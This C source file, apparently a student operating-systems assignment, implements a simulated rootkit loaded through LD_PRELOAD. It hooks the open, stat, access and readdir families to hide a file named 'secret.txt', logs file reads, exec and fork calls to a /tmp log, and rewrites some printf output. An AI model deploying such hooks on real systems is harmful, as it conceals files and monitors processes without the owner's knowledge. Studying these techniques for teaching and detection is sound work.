/*
 * rootkit.c - user-space rootkit simulation via LD_PRELOAD function hooking
 * COMP60024 OSIB - Part C
 * Student: Faraj Farook   ID: CB012653
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define HIDDEN_FILE "secret.txt"
#define LOG_PATH    "/tmp/rootkit.log"

static __thread int in_hook = 0;   /* recursion guard */

/* ---------- logging ---------- */
static void rk_log(const char *fmt, ...)
{
    FILE *fp;
    time_t now;
    struct tm *tm_info;
    char stamp[32];
    va_list ap;

    fp = fopen(LOG_PATH, "a");
    if (fp == NULL)
        return;

    now = time(NULL);
    tm_info = localtime(&now);
    strftime(stamp, sizeof(stamp), "%Y-%m-%d %H:%M:%S", tm_info);

    fprintf(fp, "[%s] [pid %d] ", stamp, getpid());
    va_start(ap, fmt);
    vfprintf(fp, fmt, ap);
    va_end(ap);
    fputc('\n', fp);
    fclose(fp);
}

static int is_hidden_path(const char *pathname)
{
    return (pathname != NULL && strstr(pathname, HIDDEN_FILE) != NULL);
}

/* ---------- runs automatically when the library is loaded ---------- */
__attribute__((constructor))
static void rk_init(void)
{
    rk_log("=== rootkit.so loaded (pid=%d ppid=%d)", getpid(), getppid());
    fprintf(stderr, "[rootkit] interception active for pid %d\n", getpid());
}

/* ---------- file access: open ---------- */
int open(const char *pathname, int flags, ...)
{
    static int (*real_open)(const char *, int, ...) = NULL;
    mode_t mode = 0;

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = va_arg(ap, mode_t);
        va_end(ap);
    }
    if (real_open == NULL)
        real_open = dlsym(RTLD_NEXT, "open");
    if (in_hook || pathname == NULL)
        return real_open(pathname, flags, mode);

    if (is_hidden_path(pathname)) {
        in_hook = 1;
        rk_log("open(\"%s\") BLOCKED -> ENOENT (concealed)", pathname);
        in_hook = 0;
        errno = ENOENT;
        return -1;
    }
    if (strcmp(pathname, LOG_PATH) != 0) {
        in_hook = 1;
        rk_log("open(\"%s\", flags=0x%x) intercepted", pathname, flags);
        in_hook = 0;
    }
    return real_open(pathname, flags, mode);
}

/* ---------- file access: openat ---------- */
int openat(int dirfd, const char *pathname, int flags, ...)
{
    static int (*real_openat)(int, const char *, int, ...) = NULL;
    mode_t mode = 0;

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = va_arg(ap, mode_t);
        va_end(ap);
    }
    if (real_openat == NULL)
        real_openat = dlsym(RTLD_NEXT, "openat");
    if (in_hook || pathname == NULL)
        return real_openat(dirfd, pathname, flags, mode);

    if (is_hidden_path(pathname)) {
        in_hook = 1;
        rk_log("openat(%d, \"%s\") BLOCKED -> ENOENT (concealed)", dirfd, pathname);
        in_hook = 0;
        errno = ENOENT;
        return -1;
    }
    if (strcmp(pathname, LOG_PATH) != 0) {
        in_hook = 1;
        rk_log("openat(%d, \"%s\") intercepted", dirfd, pathname);
        in_hook = 0;
    }
    return real_openat(dirfd, pathname, flags, mode);
}

/* ---------- file access: read ---------- */
ssize_t read(int fd, void *buf, size_t count)
{
    static ssize_t (*real_read)(int, void *, size_t) = NULL;
    ssize_t n;

    if (real_read == NULL)
        real_read = dlsym(RTLD_NEXT, "read");

    n = real_read(fd, buf, count);
    if (!in_hook && n > 0) {
        in_hook = 1;
        rk_log("read(fd=%d, %zu) -> %zd bytes", fd, count, n);
        in_hook = 0;
    }
    return n;
}

/* ---------- metadata: stat / lstat / statx / access (concealment) ---------- */
int stat(const char *pathname, struct stat *statbuf)
{
    static int (*real_stat)(const char *, struct stat *) = NULL;

    if (real_stat == NULL)
        real_stat = dlsym(RTLD_NEXT, "stat");
    if (!in_hook && is_hidden_path(pathname)) {
        in_hook = 1;
        rk_log("stat(\"%s\") BLOCKED -> ENOENT (concealed)", pathname);
        in_hook = 0;
        errno = ENOENT;
        return -1;
    }
    return real_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf)
{
    static int (*real_lstat)(const char *, struct stat *) = NULL;

    if (real_lstat == NULL)
        real_lstat = dlsym(RTLD_NEXT, "lstat");
    if (!in_hook && is_hidden_path(pathname)) {
        in_hook = 1;
        rk_log("lstat(\"%s\") BLOCKED -> ENOENT (concealed)", pathname);
        in_hook = 0;
        errno = ENOENT;
        return -1;
    }
    return real_lstat(pathname, statbuf);
}

int statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *statxbuf)
{
    static int (*real_statx)(int, const char *, int, unsigned int, struct statx *) = NULL;

    if (real_statx == NULL)
        real_statx = dlsym(RTLD_NEXT, "statx");
    if (!in_hook && is_hidden_path(pathname)) {
        in_hook = 1;
        rk_log("statx(%d, \"%s\") BLOCKED -> ENOENT (concealed)", dirfd, pathname);
        in_hook = 0;
        errno = ENOENT;
        return -1;
    }
    return real_statx(dirfd, pathname, flags, mask, statxbuf);
}

int access(const char *pathname, int mode)
{
    static int (*real_access)(const char *, int) = NULL;

    if (real_access == NULL)
        real_access = dlsym(RTLD_NEXT, "access");
    if (!in_hook && is_hidden_path(pathname)) {
        in_hook = 1;
        rk_log("access(\"%s\") BLOCKED -> ENOENT (concealed)", pathname);
        in_hook = 0;
        errno = ENOENT;
        return -1;
    }
    return real_access(pathname, mode);
}

/* ---------- directory listing: readdir (concealment) ---------- */
struct dirent *readdir(DIR *dirp)
{
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    struct dirent *entry;

    if (real_readdir == NULL)
        real_readdir = dlsym(RTLD_NEXT, "readdir");

    while ((entry = real_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDDEN_FILE) == 0) {
            in_hook = 1;
            rk_log("readdir: concealed entry \"%s\"", entry->d_name);
            in_hook = 0;
            continue;              /* pretend it is not there */
        }
        break;
    }
    return entry;
}

/* ---------- process execution monitoring ---------- */
int execve(const char *pathname, char *const argv[], char *const envp[])
{
    static int (*real_execve)(const char *, char *const[], char *const[]) = NULL;

    if (real_execve == NULL)
        real_execve = dlsym(RTLD_NEXT, "execve");

    in_hook = 1;
    rk_log("execve(\"%s\") monitored (pid=%d ppid=%d)", pathname, getpid(), getppid());
    in_hook = 0;

    return real_execve(pathname, argv, envp);
}

pid_t fork(void)
{
    static pid_t (*real_fork)(void) = NULL;
    pid_t child;

    if (real_fork == NULL)
        real_fork = dlsym(RTLD_NEXT, "fork");

    child = real_fork();
    if (!in_hook) {
        in_hook = 1;
        rk_log("fork() -> child pid %d (parent %d)", child, getpid());
        in_hook = 0;
    }
    return child;
}

/* ---------- modifying output: printf ---------- */
int printf(const char *format, ...)
{
    static int (*real_vprintf)(const char *, va_list) = NULL;
    va_list ap;
    int ret;

    if (real_vprintf == NULL)
        real_vprintf = dlsym(RTLD_NEXT, "vprintf");

    in_hook = 1;
    rk_log("printf() intercepted");
    in_hook = 0;

    va_start(ap, format);
    if (format != NULL && strstr(format, "Child process") != NULL) {
        ret = real_vprintf("[rootkit] child process message intercepted and altered\n", ap);
    } else {
        ret = real_vprintf(format, ap);
    }
    va_end(ap);
    return ret;
}
